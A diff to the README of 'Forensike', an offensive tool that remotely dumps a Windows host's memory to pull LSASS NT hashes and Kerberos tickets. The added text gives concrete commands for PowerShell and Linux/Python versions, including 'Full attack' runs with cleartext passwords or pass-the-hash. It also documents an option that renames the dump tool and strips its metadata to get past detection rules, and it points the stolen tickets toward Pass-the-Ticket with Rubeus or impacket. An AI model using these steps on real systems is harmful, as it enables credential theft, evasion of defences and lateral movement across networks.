@@ -16,19 +16,84 @@ If you want more details about the tool or Forensics techniques applied for offe
 
 ## Installation
 
-- Main installation is WinDBG on your system : https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/
-- The script directly calls the WinDBG executable, so it needs to be accessible from anywhere on your system. So make sure that the WinDBG executable you use is in your PATH !
+- WinDBG on your system : https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/
+- Make sure the WinDBG executable (`WinDbgX.exe`) is in your PATH
 
-## Usage :
+### PowerShell version
 
-- Launch the Forensike.ps1 script from a Powershell session that has local admin rights over the target
-- `target` : Give it a target. Only takes a netbios name. If you have DNS troubles in the environment you are working in, just add the target name and IP in your hosts file, the tool will retrieve the IP this way
-- `toolsDir` : Specify the folder in which you put your DumpIt executable so that Forensike can transfer it on the target and initiates Crash Dump generation
-- `toolsDir` : Specify the folder in which you want to write the `forensike_results.txt` with parsed hashes. The script also provides you with 2 files `lsass.txt` which contains the LSASS EPROCESS address in the crash dump you will generate and the `hashes.txt` which is the raw output of mimilib.dll. If the script did not properly quit or if you need to debug it, these 2 files can help you.
-- The script uses WMI queries to retrieve some information
-- Disk space Estimation : The script roughly calculates how large the final crash dump will be on the target system and tell you which target disk has the most avalaible space, so you know if there is have enough space on the target to welcome the crash dump before lauching the attack
-- `Metadata` : Uses rcedit-x64.exe to tamper with DumpIt.exe metadate. Helps if you need bypassing detection rules based on filename or description AND if the EDR let's you load new executable broken signature 
-- `Kerberos` : Extracts Kerberos tickets from the target in `.kirbi` format. The script uses WMI to retrieve the LSASS PID, then triggers a minidump of LSASS via the built-in `comsvcs.dll MiniDump` method (no extra binary needed on the target). The minidump is pulled back to the attacker machine via the existing PSDrive mapping, and `mimikatz.exe` is run locally with `sekurlsa::minidump` + `sekurlsa::tickets /export` to write the `.kirbi` files to a `kirbi/` subfolder inside your `dumpDir`. Requires `mimikatz.exe` to be present in `toolsDir`. The exported tickets can then be used for Pass-the-Ticket attacks with Rubeus (`ptt`) or impacket (`ticketConverter.py` + any `-k` tool).
+No additional dependencies — run directly from a PowerShell session with admin rights on the target.
+
+### Python version (Linux-compatible)
+
+```bash
+# Install with pipx (recommended — isolated env, all deps included)
+pipx install .
+
+# Or classic pip
+pip install .
+
+# System dependency for CIFS mount
+sudo apt install cifs-utils
+```
+
+All Python dependencies (**impacket**, **volatility3**, **pypykatz**) are installed automatically. Optional PE obfuscation support: `pip install forensike[metadata]`.
+
+Works on Linux — no WinDBG needed. The crash dump stays on the target and is accessed remotely via CIFS mount (Linux equivalent of `\\target\C$` UNC access).
+
+The extraction module (`lsass_extract`) is Forensike's custom "mimilib for Linux":
+1. **volatility3** parses the crash dump and dumps LSASS virtual memory + modules
+2. **MinidumpBuilder** assembles a valid Windows Minidump (MDMP) from that data
+3. **pypykatz** parses the minidump and extracts NT hashes + Kerberos tickets
+
+Same result as WinDBG + mimilib, nothing downloaded.
+
+Supports pass-the-hash (`-H`) and Kerberos auth (`-K`).
+
+## Usage
+
+### PowerShell
+
+```powershell
+.\Forensike.ps1 -target WS01 -toolsDir .\tools -dumpDir .\output
+.\Forensike.ps1 -target WS01 -toolsDir .\tools -dumpDir .\output -Metadata -Kerberos
+```
+
+### Python
+
+```bash
+# Full attack — DumpIt + remote extraction from Linux
+forensike WS01 --tools-dir ./tools --dump-dir ./output -d CORP -u admin -p P@ssw0rd
+
+# With Kerberos ticket export
+forensike WS01 --tools-dir ./tools --dump-dir ./output -d CORP -u admin -p P@ssw0rd --kerberos
+
+# Reuse dump from previous run or manual CIFS mount
+forensike WS01 --tools-dir ./tools --dump-dir ./output -d CORP -u admin -p P@ssw0rd \
+    --dump-file /mnt/target/Windows/Temp/Forensike/Forensike.dmp
+
+# PTH + metadata obfuscation
+forensike WS01 --tools-dir ./tools --dump-dir ./output -d CORP -u admin -H :nthash --metadata
+
+# Standalone extraction — parse an existing crash dump without remote ops
+lsass-extract /path/to/crashdump.dmp -o ./output -k ./kirbi
+```
+
+## Parameters
+
+- `target` : Target hostname (NetBIOS name). If DNS can't resolve it, add the entry in your hosts file
+- `toolsDir` / `--tools-dir` : Folder containing DumpIt.exe, mimilib.dll, and rcedit-x64.exe
+- `dumpDir` / `--dump-dir` : Output folder for `forensike_results.txt`, `lsass.txt` (LSASS EPROCESS address), `hashes.txt` (raw mimilib output)
+- `Metadata` / `--metadata` : Rename DumpIt.exe randomly and strip PE metadata via rcedit-x64.exe before uploading to target
+- `Kerberos` / `--kerberos` : Extract Kerberos tickets as `.kirbi` files. PowerShell: third WinDBG pass with mimilib on the crash dump. Python: vol3 extracts LSASS memory from the crash dump, MinidumpBuilder creates a valid minidump, pypykatz exports `.kirbi`. Exported tickets can be used for Pass-the-Ticket with Rubeus (`ptt`) or impacket (`ticketConverter.py` + any `-k` tool)
+- `--dump-file` (Python only) : Path to an existing crash dump — skip acquisition and go straight to extraction (e.g. from a manual CIFS mount or previous run)
+
+### Python-only auth options
+
+- `-d` / `--domain` : Domain (default: `.`)
+- `-u` / `--username` : Username
+- `-p` / `--password` : Cleartext password
+- `-H` / `--hashes` : NTLM hash in `LM:NT` format (pass-the-hash)
+- `-K` / `--auth-kerberos` : Kerberos auth using `$KRB5CCNAME` ccache
 
 Enjoy !
 
